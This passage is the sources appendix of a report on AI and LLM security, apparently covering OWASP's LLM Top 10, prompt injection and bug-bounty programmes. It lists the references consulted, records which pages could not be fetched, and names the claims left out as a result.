* <https://owasp.org/www-project-top-10-for-large-language-model-applications/> - archived 2023 v1.1 list; states the current edition is the OWASP GenAI LLM Top 10 2026, published 4 Aug 2026, with development moved to the GenAI Security Project.
* <https://docs.modulos.ai/frameworks/owasp-top-10-llm/index> - LLM01:2025 to LLM10:2025 titles, used here because the OWASP GenAI pages would not serve.
* <https://cdn.openai.com/pdf/dd8e7875-e606-42b4-80a1-f824e4e11cf4/prevent-url-data-exfil.pdf> (Feb 2026) - "Preventing URL-Based Data Exfiltration in Language-Model Agents"; retrieved but the PDF could not be text-extracted in this environment, so it is described only via the Embrace The Red post above.
* <https://bugcrowd.com/vulnerability-rating-taxonomy> - VRT is at version 1.19; the page served no category data, so no claim is made here about AI entries in the VRT.

**Could not be fetched, and what was lost.**

* <https://genai.owasp.org/llm-top-10/>, <https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/>, <https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/> - all HTTP 403. The 2026 edition's ten entries and its changes versus 2025 are therefore not stated in this document; only its existence and publication date, which come from the owasp.org project page.
* <https://atlas.mitre.org/> and technique pages under it - the root served no body and technique URLs returned 404. No ATLAS technique or tactic identifier is asserted anywhere above, deliberately: the IDs that appeared in search summaries were not verifiable against the source.
* <https://bughunters.google.com/about/rules/google-friends/ai-vulnerability-reward-program-rules> - served no body. The scope and reward figures in Part A come from SecurityWeek's report and are marked as such at the point of use.
* <https://openai.com/index/hardening-atlas-against-prompt-injection/> - HTTP 403. OpenAI's Atlas position is taken from CyberScoop's reporting instead.
* <https://labs.cloudsecurityalliance.org/research/csa-research-note-unicode-instruction-injection-ai-skills-20/> - HTTP 403. Unicode-tag injection is sourced from Rehberger's post instead.
* <https://www.computing.co.uk/news/2026/security/bug-bounty-platforms-battle-ai-slop> and <https://thenewstack.io/curl-fights-a-flood-of-ai-generated-bug-reports-from-hackerone/> - no article body served. Platform-level statistics on AI-generated report volume are therefore not asserted; only curl's own published numbers are used.

Search-result summaries also carried claims about curl's programme being closed
and later reopened during 2026, and about MITRE ATLAS version numbers. Neither
could be confirmed against a fetched primary source, so neither is asserted.
